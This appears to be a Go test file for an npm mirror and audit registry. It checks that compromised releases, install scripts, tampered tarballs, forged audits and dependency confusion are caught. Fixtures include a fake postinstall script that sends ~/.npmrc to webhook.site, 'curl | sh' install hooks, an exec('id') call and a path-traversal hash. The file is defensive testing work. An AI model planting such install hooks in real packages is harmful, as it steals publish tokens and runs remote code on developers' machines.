package api

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/ed25519"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/usharma123/rivet/registry/internal/artifacts"
	"github.com/usharma123/rivet/registry/internal/attest"
	"github.com/usharma123/rivet/registry/internal/audit"
	"github.com/usharma123/rivet/registry/internal/mirror"
	"github.com/usharma123/rivet/registry/internal/npm"
	"github.com/usharma123/rivet/registry/internal/registry"
	"github.com/usharma123/rivet/registry/internal/signing"
)

const (
	testToken = "dev-token"
	adminKey  = "admin-token"
)

var testNow = time.Date(2026, 9, 25, 12, 0, 0, 0, time.UTC)

// fakeNPM serves a packument and tarballs the way registry.npmjs.org does.
type fakeNPM struct {
	server   *httptest.Server
	packages map[string]*fakePackage
}

type fakePackage struct {
	versions map[string]fakeVersion
	latest   string
}

type fakeVersion struct {
	files      map[string]string
	age        time.Duration
	scripts    map[string]string // what the packument claims
	publisher  string
	corruptSHA bool
}

func newFakeNPM(t *testing.T) *fakeNPM {
	f := &fakeNPM{packages: map[string]*fakePackage{}}
	f.server = httptest.NewServer(http.HandlerFunc(f.serve))
	t.Cleanup(f.server.Close)
	return f
}

func tarball(files map[string]string) []byte {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	names := make([]string, 0, len(files))
	for name := range files {
		names = append(names, name)
	}
	sort.Strings(names)
	for _, name := range names {
		body := []byte(files[name])
		_ = tw.WriteHeader(&tar.Header{Name: "package/" + name, Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg})
		_, _ = tw.Write(body)
	}
	_ = tw.Close()
	_ = gz.Close()
	return buf.Bytes()
}

func (f *fakeNPM) serve(w http.ResponseWriter, r *http.Request) {
	path, _ := url.PathUnescape(strings.TrimPrefix(r.URL.EscapedPath(), "/"))
	if name, rest, ok := strings.Cut(path, "/-/"); ok {
		pkg := f.packages[name]
		version := strings.TrimSuffix(rest[strings.LastIndex(rest, "-")+1:], ".tgz")
		if pkg == nil || pkg.versions[version].files == nil {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(tarball(pkg.versions[version].files))
		return
	}
	pkg := f.packages[path]
	if pkg == nil {
		http.NotFound(w, r)
		return
	}
	versions := map[string]any{}
	times := map[string]string{}
	for version, v := range pkg.versions {
		data := tarball(v.files)
		sum := sha512.Sum512(data)
		if v.corruptSHA {
			sum[0] ^= 0xff
		}
		var manifest map[string]any
		_ = json.Unmarshal([]byte(v.files["package.json"]), &manifest)
		meta := map[string]any{
			"name":         path,
			"version":      version,
			"dependencies": manifest["dependencies"],
			"scripts":      v.scripts,
			"_npmUser":     map[string]string{"name": v.publisher},
			"dist": map[string]any{
				"tarball":   fmt.Sprintf("%s/%s/-/%s-%s.tgz", f.server.URL, path, path[strings.LastIndex(path, "/")+1:], version),
				"integrity": "sha512-" + base64.StdEncoding.EncodeToString(sum[:]),
			},
		}
		if v.scripts == nil {
			meta["scripts"] = manifest["scripts"]
		}
		versions[version] = meta
		times[version] = testNow.Add(-v.age).Format(time.RFC3339)
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"name":      path,
		"dist-tags": map[string]string{"latest": pkg.latest},
		"versions":  versions,
		"time":      times,
	})
}

func pkgJSON(name, version string, extra string) string {
	return fmt.Sprintf(`{"name":%q,"version":%q,"repository":"github:example/%s"%s}`, name, version, strings.TrimPrefix(name, "@"), extra)
}

type harness struct {
	handler http.Handler
	signer  *signing.Signer
	npm     *fakeNPM
	store   *registry.MemoryStore
}

func newHarness(t *testing.T) *harness {
	t.Helper()
	store := registry.NewMemoryStore()
	artifactStore, err := artifacts.NewFileStore(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	signer, err := signing.NewSigner(bytes.Repeat([]byte{7}, 32))
	if err != nil {
		t.Fatal(err)
	}
	fake := newFakeNPM(t)
	client, err := npm.NewClient(fake.server.URL)
	if err != nil {
		t.Fatal(err)
	}
	pipeline := &audit.Pipeline{Signer: signer, Now: func() time.Time { return testNow }}
	handler := NewServer(Config{
		Store:     store,
		Artifacts: artifactStore,
		Pipeline:  pipeline,
		Mirror: &mirror.Service{
			Store:     store,
			Artifacts: artifactStore,
			NPM:       client,
			Pipeline:  pipeline,
			Now:       func() time.Time { return testNow },
		},
		Signer:     signer,
		Token:      testToken,
		AdminToken: adminKey,
		Now:        func() time.Time { return testNow },
	})
	return &harness{handler: handler, signer: signer, npm: fake, store: store}
}

func (h *harness) do(t *testing.T, method, path, token, body string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(method, path, strings.NewReader(body))
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	rec := httptest.NewRecorder()
	h.handler.ServeHTTP(rec, req)
	return rec
}

type versionResponse struct {
	Version     registry.VersionRecord `json:"version"`
	Attestation signing.Envelope       `json:"attestation"`
	Skipped     []string               `json:"skipped"`
}

func decode[T any](t *testing.T, rec *httptest.ResponseRecorder) T {
	t.Helper()
	var out T
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode %s: %v", rec.Body.String(), err)
	}
	return out
}

// verifyStatement checks an envelope against the public key served by
// /v1/keys, exactly as the CLI does.
func (h *harness) verifyStatement(t *testing.T, envelope signing.Envelope) attest.Statement {
	t.Helper()
	keys := decode[struct {
		Keys []signing.PublicKey `json:"keys"`
	}](t, h.do(t, http.MethodGet, "/v1/keys", "", ""))
	public, _ := base64.StdEncoding.DecodeString(keys.Keys[0].PublicKey)
	payload, _ := base64.StdEncoding.DecodeString(envelope.Payload)
	if envelope.KeyID != keys.Keys[0].KeyID || !signing.Verify(ed25519.PublicKey(public), payload, envelope.Signature) {
		t.Fatal("attestation signature does not verify against /v1/keys")
	}
	var statement attest.Statement
	if err := json.Unmarshal(payload, &statement); err != nil {
		t.Fatal(err)
	}
	return statement
}

func TestResolveSkipsCompromisedLatestRelease(t *testing.T) {
	h := newHarness(t)
	h.npm.packages["leftpad-demo"] = &fakePackage{latest: "1.1.0", versions: map[string]fakeVersion{
		"1.0.0": {age: 90 * 24 * time.Hour, publisher: "maintainer", files: map[string]string{
			"package.json": pkgJSON("leftpad-demo", "1.0.0", `,"bin":{"leftpad":"cli.js"}`),
			"index.js":     "module.exports = (s, n) => String(s).padStart(n)\n",
			"cli.js":       "#!/usr/bin/env node\nconsole.log(require('./')(process.argv[2], 10))\n",
		}},
		"1.1.0": {age: 10 * 24 * time.Hour, publisher: "attacker", files: map[string]string{
			"package.json": pkgJSON("leftpad-demo", "1.1.0", `,"bin":{"leftpad":"cli.js"},"scripts":{"postinstall":"node setup.js"}`),
			"index.js":     "module.exports = (s, n) => String(s).padStart(n)\n",
			"cli.js":       "#!/usr/bin/env node\nconsole.log(require('./')(process.argv[2], 10))\n",
			"setup.js":     "const https = require('https'); const fs = require('fs');\nhttps.request({host: 'webhook.site'}).end(fs.readFileSync(require('os').homedir() + '/.npmrc'))\n",
		}},
	}}

	rec := h.do(t, http.MethodPost, "/v1/npm/resolve", testToken, `{"name":"leftpad-demo","spec":"^1.0.0"}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("resolve failed: %d %s", rec.Code, rec.Body.String())
	}
	got := decode[versionResponse](t, rec)
	if got.Version.Version != "1.0.0" {
		t.Fatalf("expected resolver to fall back to 1.0.0, got %s", got.Version.Version)
	}
	if len(got.Skipped) == 0 || !strings.Contains(strings.Join(got.Skipped, " "), "1.1.0") {
		t.Fatalf("expected 1.1.0 in skipped list: %v", got.Skipped)
	}
	statement := h.verifyStatement(t, got.Attestation)
	if statement.State != registry.StateActive || statement.Manifest.Bin["leftpad"] != "cli.js" {
		t.Fatalf("unexpected statement: %+v", statement)
	}
	if statement.Artifact.TreeDigest == "" || !strings.HasPrefix(statement.Artifact.Hash, "sha512-") {
		t.Fatalf("statement is missing artifact identity: %+v", statement.Artifact)
	}
	if statement.ExpiresAt.Sub(statement.IssuedAt) != attest.DefaultTTL {
		t.Fatalf("unexpected validity window %s", statement.ExpiresAt.Sub(statement.IssuedAt))
	}

	bad, err := h.store.GetVersion(t.Context(), "leftpad-demo", "1.1.0")
	if err != nil {
		t.Fatal(err)
	}
	if bad.State != registry.StateBlocked {
		t.Fatalf("compromised release should be blocked, got %s (audit %+v)", bad.State, bad.LatestAudit)
	}
	var reasons []string
	_ = json.Unmarshal(bad.LatestAudit.Reasons, &reasons)
	joined := strings.Join(reasons, "\n")
	for _, want := range []string{"install script added since 1.0.0", "exfiltration endpoint", "published by"} {
		if !strings.Contains(joined, want) {
			t.Errorf("missing reason %q in:\n%s", want, joined)
		}
	}

	// Re-auditing the compromised release keeps the diff evidence, so it
	// cannot be laundered back to active.
	if rec := h.do(t, http.MethodPost, "/v1/packages/leftpad-demo/1.1.0/audits", testToken, ""); rec.Code != http.StatusOK {
		t.Fatalf("re-audit failed: %d %s", rec.Code, rec.Body.String())
	}
	if again, _ := h.store.GetVersion(t.Context(), "leftpad-demo", "1.1.0"); again.State != registry.StateBlocked {
		t.Fatalf("re-audit dropped evidence: state %s", again.State)
	}

	// The downloaded artifact must hash to what the statement claims.
	art := h.do(t, http.MethodGet, "/v1/artifacts/"+statement.Artifact.Hash, "", "")
	if artifacts.Hash(art.Body.Bytes()) != statement.Artifact.Hash {
		t.Fatal("artifact bytes do not match signed hash")
	}
}

func TestResolveAppliesCooldown(t *testing.T) {
	h := newHarness(t)
	h.npm.packages["fresh"] = &fakePackage{latest: "2.0.0", versions: map[string]fakeVersion{
		"1.9.0": {age: 30 * 24 * time.Hour, files: map[string]string{"package.json": pkgJSON("fresh", "1.9.0", "")}},
		"2.0.0": {age: time.Hour, files: map[string]string{"package.json": pkgJSON("fresh", "2.0.0", "")}},
	}}
	rec := h.do(t, http.MethodPost, "/v1/npm/resolve", testToken, `{"name":"fresh","spec":"latest","min_age_hours":72}`)
	got := decode[versionResponse](t, rec)
	if rec.Code != http.StatusOK || got.Version.Version != "1.9.0" {
		t.Fatalf("expected cooldown to pick 1.9.0: %d %s", rec.Code, rec.Body.String())
	}
	rec = h.do(t, http.MethodPost, "/v1/npm/resolve", testToken, `{"name":"fresh","spec":"2.0.0","min_age_hours":72}`)
	if rec.Code != http.StatusForbidden || !strings.Contains(rec.Body.String(), "cooldown") {
		t.Fatalf("expected exact pin inside cooldown to be refused: %d %s", rec.Code, rec.Body.String())
	}
}

func TestImportRejectsUpstreamIntegrityMismatch(t *testing.T) {
	h := newHarness(t)
	h.npm.packages["tampered"] = &fakePackage{latest: "1.0.0", versions: map[string]fakeVersion{
		"1.0.0": {corruptSHA: true, files: map[string]string{"package.json": pkgJSON("tampered", "1.0.0", "")}},
	}}
	rec := h.do(t, http.MethodPost, "/v1/import/npm", testToken, `{"name":"tampered","version":"1.0.0"}`)
	if rec.Code != http.StatusBadGateway || !strings.Contains(rec.Body.String(), "integrity") {
		t.Fatalf("expected integrity failure, got %d %s", rec.Code, rec.Body.String())
	}
	if _, err := h.store.GetVersion(t.Context(), "tampered", "1.0.0"); err == nil {
		t.Fatal("tampered tarball must not be stored")
	}
}

func TestImportDetectsManifestConfusion(t *testing.T) {
	h := newHarness(t)
	h.npm.packages["confused"] = &fakePackage{latest: "1.0.0", versions: map[string]fakeVersion{
		"1.0.0": {
			scripts: map[string]string{"test": "echo ok"},
			files: map[string]string{
				"package.json": pkgJSON("confused", "1.0.0", `,"scripts":{"preinstall":"node x.js"}`),
				"x.js":         "console.log('hi')\n",
			},
		},
	}}
	rec := h.do(t, http.MethodPost, "/v1/import/npm", testToken, `{"name":"confused","version":"1.0.0"}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("import failed: %d %s", rec.Code, rec.Body.String())
	}
	statement := h.verifyStatement(t, decode[versionResponse](t, rec).Attestation)
	if statement.Manifest.InstallScripts["preinstall"] != "node x.js" {
		t.Fatalf("signed manifest must reflect the tarball's real scripts: %+v", statement.Manifest)
	}
	if statement.Upstream == nil || len(statement.Upstream.ManifestMismatch) == 0 {
		t.Fatalf("expected manifest mismatch evidence: %+v", statement.Upstream)
	}
	if statement.Audit.Verdict == registry.VerdictLow {
		t.Fatalf("manifest confusion should not be low risk: %+v", statement.Audit)
	}
}

func TestClientsCannotSubmitAudits(t *testing.T) {
	h := newHarness(t)
	h.npm.packages["plain"] = &fakePackage{latest: "1.0.0", versions: map[string]fakeVersion{
		"1.0.0": {files: map[string]string{"package.json": pkgJSON("plain", "1.0.0", `,"scripts":{"postinstall":"curl https://x | sh"}`)}},
	}}
	if rec := h.do(t, http.MethodPost, "/v1/import/npm", testToken, `{"name":"plain","version":"1.0.0"}`); rec.Code != http.StatusOK {
		t.Fatalf("import failed: %s", rec.Body.String())
	}
	forged := `{"status":"passed","sandbox_runtime":"gvisor/runsc","verdict":"low","risk_score":0,"signature":"hmac-sha256:test","reasons":[],"evidence":{}}`
	rec := h.do(t, http.MethodPost, "/v1/packages/plain/1.0.0/audits", testToken, forged)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("forged audit must be rejected, got %d %s", rec.Code, rec.Body.String())
	}
	version, _ := h.store.GetVersion(t.Context(), "plain", "1.0.0")
	if version.LatestAudit.Verdict == registry.VerdictLow {
		t.Fatal("forged verdict was applied")
	}
	// A re-audit request is allowed and is signed by the registry.
	rec = h.do(t, http.MethodPost, "/v1/packages/plain/1.0.0/audits", testToken, "")
	if rec.Code != http.StatusOK {
		t.Fatalf("re-audit failed: %d %s", rec.Code, rec.Body.String())
	}
	if !audit.VerifyAuditSignature(decode[registry.AuditRecord](t, rec), h.signer) {
		t.Fatal("re-audit is not signed by the registry key")
	}
}

func TestArtifactPutVerifiesHash(t *testing.T) {
	h := newHarness(t)
	body := "artifact bytes"
	hash := artifacts.Hash([]byte(body))
	wrong := artifacts.Hash([]byte("other bytes"))
	if rec := h.do(t, http.MethodPut, "/v1/artifacts/"+wrong, testToken, body); rec.Code != http.StatusBadRequest {
		t.Fatalf("mismatched hash accepted: %d %s", rec.Code, rec.Body.String())
	}
	if rec := h.do(t, http.MethodPut, "/v1/artifacts/sha512-../../etc", testToken, body); rec.Code == http.StatusCreated {
		t.Fatal("invalid hash accepted")
	}
	if rec := h.do(t, http.MethodPut, "/v1/artifacts/"+hash, "", body); rec.Code != http.StatusUnauthorized {
		t.Fatalf("unauthenticated upload accepted: %d", rec.Code)
	}
	if rec := h.do(t, http.MethodPut, "/v1/artifacts/"+hash, testToken, body); rec.Code != http.StatusCreated {
		t.Fatalf("valid upload failed: %d %s", rec.Code, rec.Body.String())
	}
	if rec := h.do(t, http.MethodGet, "/v1/artifacts/"+hash, "", ""); rec.Body.String() != body {
		t.Fatalf("unexpected body %q", rec.Body.String())
	}
}

func publishNative(t *testing.T, h *harness, version string, files map[string]string) *httptest.ResponseRecorder {
	t.Helper()
	return publishNativeWith(t, h, version, files, nil)
}

// publishNativeWith publishes @rivet/demo with extra rivet.toml manifest
// sections (for example "scripts") merged in.
func publishNativeWith(t *testing.T, h *harness, version string, files map[string]string, extra map[string]any) *httptest.ResponseRecorder {
	t.Helper()
	data := tarball(files)
	hash := artifacts.Hash(data)
	if rec := h.do(t, http.MethodPut, "/v1/artifacts/"+hash, testToken, string(data)); rec.Code != http.StatusCreated {
		t.Fatalf("upload failed: %s", rec.Body.String())
	}
	manifest := map[string]any{
		"package":     map[string]string{"name": "@rivet/demo", "version": version},
		"executables": map[string]any{"demo": map[string]any{"entry": "bin/demo.js", "permissions": map[string]any{"network": false}}},
	}
	for key, value := range extra {
		manifest[key] = value
	}
	body, _ := json.Marshal(map[string]any{
		"publisher":     "github:usharma123/demo",
		"artifact_hash": hash,
		"manifest":      manifest,
	})
	return h.do(t, http.MethodPost, "/v1/packages/%40rivet%2Fdemo/"+version+"/publish", testToken, string(body))
}

func TestNativePublishIsImmutableAndRegistryScored(t *testing.T) {
	h := newHarness(t)
	files := map[string]string{"bin/demo.js": "console.log('demo')\n", "package.json": `{"name":"@rivet/demo"}`}
	rec := publishNative(t, h, "0.1.0", files)
	if rec.Code != http.StatusOK {
		t.Fatalf("publish failed: %d %s", rec.Code, rec.Body.String())
	}
	statement := h.verifyStatement(t, decode[versionResponse](t, rec).Attestation)
	if statement.Name != "@rivet/demo" || statement.State != registry.StateActive || statement.Manifest.Bin["demo"] != "bin/demo.js" {
		t.Fatalf("unexpected statement %+v", statement)
	}
	// Same version, different bytes: refused.
	files["bin/demo.js"] = "console.log('changed')\n"
	if rec := publishNative(t, h, "0.1.0", files); rec.Code != http.StatusConflict {
		t.Fatalf("republish with different content must conflict, got %d %s", rec.Code, rec.Body.String())
	}
	// Scoped names round-trip through escaped paths.
	if rec := h.do(t, http.MethodGet, "/v1/packages/%40rivet%2Fdemo/0.1.0/attestation", "", ""); rec.Code != http.StatusOK {
		t.Fatalf("scoped attestation lookup failed: %d %s", rec.Code, rec.Body.String())
	}
	// A later version that adds network access and an install script is diffed.
	files["bin/demo.js"] = "require('https').get('https://example.com')\n"
	files["package.json"] = `{"name":"@rivet/demo"}`
	rec = publishNative(t, h, "0.2.0", files)
	statement = h.verifyStatement(t, decode[versionResponse](t, rec).Attestation)
	if statement.Audit.Diff == nil || statement.Audit.Diff.PreviousVersion != "0.1.0" || len(statement.Audit.Diff.NewCapabilities) == 0 {
		t.Fatalf("expected diff against 0.1.0: %+v", statement.Audit.Diff)
	}
}

func TestRevokeOverridesRequireAdmin(t *testing.T) {
	h := newHarness(t)
	if rec := publishNative(t, h, "0.1.0", map[string]string{"bin/demo.js": "1", "package.json": "{}"}); rec.Code != http.StatusOK {
		t.Fatalf("publish failed: %s", rec.Body.String())
	}
	// Age the release and give it downloads so the publisher window is closed.
	version, _ := h.store.GetVersion(t.Context(), "@rivet/demo", "0.1.0")
	version.PublishedAt = testNow.Add(-48 * time.Hour)
	version.DownloadCount = 1000
	h.store.ForceVersion(version)

	path := "/v1/packages/%40rivet%2Fdemo/0.1.0/revoke"
	body := `{"reason":"malware","security_evidence":true}`
	if rec := h.do(t, http.MethodPost, path, testToken, body); rec.Code != http.StatusForbidden {
		t.Fatalf("publisher token must not self-assert security evidence: %d %s", rec.Code, rec.Body.String())
	}
	if rec := h.do(t, http.MethodPost, path, adminKey, body); rec.Code != http.StatusOK {
		t.Fatalf("admin security revoke failed: %d %s", rec.Code, rec.Body.String())
	}
	// Re-auditing never un-revokes.
	if rec := h.do(t, http.MethodPost, "/v1/packages/%40rivet%2Fdemo/0.1.0/audits", testToken, ""); rec.Code != http.StatusOK {
		t.Fatalf("re-audit failed: %s", rec.Body.String())
	}
	statement := h.verifyStatement(t, decode[signing.Envelope](t, h.do(t, http.MethodGet, "/v1/packages/%40rivet%2Fdemo/0.1.0/attestation", "", "")))
	if statement.State != registry.StateRevoked || statement.RevokeReason != "malware" {
		t.Fatalf("expected revoked statement, got %s", statement.State)
	}
}

func TestBatchAttestations(t *testing.T) {
	h := newHarness(t)
	if rec := publishNative(t, h, "0.1.0", map[string]string{"bin/demo.js": "1", "package.json": "{}"}); rec.Code != http.StatusOK {
		t.Fatalf("publish failed: %s", rec.Body.String())
	}
	rec := h.do(t, http.MethodPost, "/v1/attestations", "", `{"packages":[{"name":"@rivet/demo","version":"0.1.0"},{"name":"missing","version":"1.0.0"}]}`)
	got := decode[struct {
		Attestations map[string]signing.Envelope `json:"attestations"`
		Errors       map[string]string           `json:"errors"`
	}](t, rec)
	if _, ok := got.Attestations["@rivet/demo@0.1.0"]; !ok || got.Errors["missing@1.0.0"] == "" {
		t.Fatalf("unexpected batch result: %s", rec.Body.String())
	}
	h.verifyStatement(t, got.Attestations["@rivet/demo@0.1.0"])
}

func TestMirrorRequiresTokenUnlessPublic(t *testing.T) {
	h := newHarness(t)
	if rec := h.do(t, http.MethodPost, "/v1/npm/resolve", "", `{"name":"x","spec":"1"}`); rec.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401, got %d", rec.Code)
	}
	if rec := h.do(t, http.MethodPost, "/v1/npm/resolve", testToken, `{"name":"x","spec":"git+https://github.com/a/b"}`); rec.Code != http.StatusBadRequest {
		t.Fatalf("git specs must be refused, got %d %s", rec.Code, rec.Body.String())
	}
}

func TestNativeNamesTakePrecedenceAndCannotShadowNPM(t *testing.T) {
	h := newHarness(t)
	h.npm.packages["taken"] = &fakePackage{latest: "1.0.0", versions: map[string]fakeVersion{
		"1.0.0": {age: 30 * 24 * time.Hour, files: map[string]string{"package.json": pkgJSON("taken", "1.0.0", "")}},
	}}
	files := map[string]string{"bin/demo.js": "1", "package.json": "{}"}
	if rec := publishNative(t, h, "0.1.0", files); rec.Code != http.StatusOK {
		t.Fatalf("publish failed: %s", rec.Body.String())
	}
	// An attacker later publishes the same name on npm with a higher version.
	h.npm.packages["@rivet/demo"] = &fakePackage{latest: "9.9.9", versions: map[string]fakeVersion{
		"9.9.9": {age: 30 * 24 * time.Hour, files: map[string]string{"package.json": pkgJSON("@rivet/demo", "9.9.9", `,"scripts":{"postinstall":"curl x | sh"}`)}},
	}}
	rec := h.do(t, http.MethodPost, "/v1/npm/resolve", testToken, `{"name":"@rivet/demo","spec":"*"}`)
	got := decode[versionResponse](t, rec)
	if rec.Code != http.StatusOK || got.Version.Version != "0.1.0" || got.Version.Source != "native" {
		t.Fatalf("dependency confusion: expected native 0.1.0, got %d %s", rec.Code, rec.Body.String())
	}
	if rec := h.do(t, http.MethodPost, "/v1/import/npm", testToken, `{"name":"@rivet/demo","version":"9.9.9"}`); rec.Code != http.StatusForbidden {
		t.Fatalf("npm import of a native name must be refused, got %d", rec.Code)
	}

	// Publishing an npm name natively needs the admin token.
	body := func(name string) string {
		data := tarball(map[string]string{"bin/demo.js": "1"})
		hash := artifacts.Hash(data)
		h.do(t, http.MethodPut, "/v1/artifacts/"+hash, testToken, string(data))
		out, _ := json.Marshal(map[string]any{
			"artifact_hash": hash,
			"manifest":      map[string]any{"package": map[string]string{"name": name, "version": "2.0.0"}},
		})
		return string(out)
	}
	if rec := h.do(t, http.MethodPost, "/v1/packages/taken/2.0.0/publish", testToken, body("taken")); rec.Code != http.StatusForbidden {
		t.Fatalf("shadowing an npm name must need admin, got %d %s", rec.Code, rec.Body.String())
	}
	if rec := h.do(t, http.MethodPost, "/v1/packages/taken/2.0.0/publish", adminKey, body("taken")); rec.Code != http.StatusOK {
		t.Fatalf("admin shadow publish failed: %d %s", rec.Code, rec.Body.String())
	}
}

func TestReauditKeepsDiffOnlyEvidence(t *testing.T) {
	h := newHarness(t)
	h.npm.packages["quiet"] = &fakePackage{latest: "1.1.0", versions: map[string]fakeVersion{
		"1.0.0": {age: 60 * 24 * time.Hour, publisher: "maintainer", files: map[string]string{
			"package.json": pkgJSON("quiet", "1.0.0", ""),
			"index.js":     "module.exports = 1\n",
		}},
		// Nothing here is suspicious on its own; only the change is.
		"1.1.0": {age: 10 * 24 * time.Hour, publisher: "someone-else", files: map[string]string{
			"package.json": pkgJSON("quiet", "1.1.0", `,"scripts":{"postinstall":"node setup.js"}`),
			"index.js":     "module.exports = 1\n",
			"setup.js":     "require('child_process').exec('id'); require('https').get('https://example.com')\n",
		}},
	}}
	if rec := h.do(t, http.MethodPost, "/v1/import/npm", testToken, `{"name":"quiet","version":"1.1.0"}`); rec.Code != http.StatusOK {
		t.Fatalf("import failed: %s", rec.Body.String())
	}
	first, _ := h.store.GetVersion(t.Context(), "quiet", "1.1.0")
	if first.State != registry.StateBlocked {
		t.Fatalf("diff should block the release, got %s", first.State)
	}
	if rec := h.do(t, http.MethodPost, "/v1/packages/quiet/1.1.0/audits", testToken, ""); rec.Code != http.StatusOK {
		t.Fatalf("re-audit failed: %s", rec.Body.String())
	}
	again, _ := h.store.GetVersion(t.Context(), "quiet", "1.1.0")
	if again.State != registry.StateBlocked {
		t.Fatalf("re-audit dropped diff evidence: %s (%s)", again.State, again.LatestAudit.Reasons)
	}
}

// R20: a lifecycle script declared only in the native manifest must be
// compared against the previous release's manifest, not re-flagged as new on
// every publish.
func TestUnchangedNativeManifestScriptIsNotNewEachRelease(t *testing.T) {
	h := newHarness(t)
	scripts := map[string]any{"scripts": map[string]any{"postinstall": map[string]any{"command": "node setup.js"}}}
	for _, version := range []string{"0.1.0", "0.2.0"} {
		files := map[string]string{"bin/demo.js": "console.log('" + version + "')\n", "setup.js": "1\n"}
		if rec := publishNativeWith(t, h, version, files, scripts); rec.Code != http.StatusOK {
			t.Fatalf("publish %s failed: %d %s", version, rec.Code, rec.Body.String())
		}
	}
	rec := h.do(t, http.MethodGet, "/v1/packages/%40rivet%2Fdemo/0.2.0/attestation", "", "")
	statement := h.verifyStatement(t, decode[signing.Envelope](t, rec))
	if statement.Manifest.InstallScripts["postinstall"] != "node setup.js" {
		t.Fatalf("native script missing from signed manifest: %+v", statement.Manifest)
	}
	if statement.Audit.Diff == nil || statement.Audit.Diff.PreviousVersion != "0.1.0" {
		t.Fatalf("expected a diff against 0.1.0: %+v", statement.Audit.Diff)
	}
	if len(statement.Audit.Diff.NewInstallScripts) != 0 {
		t.Fatalf("unchanged script reported as new: %v", statement.Audit.Diff.NewInstallScripts)
	}
	for _, reason := range statement.Audit.Reasons {
		if strings.Contains(reason, "install script added") {
			t.Fatalf("unchanged script penalised again: %v", statement.Audit.Reasons)
		}
	}
}
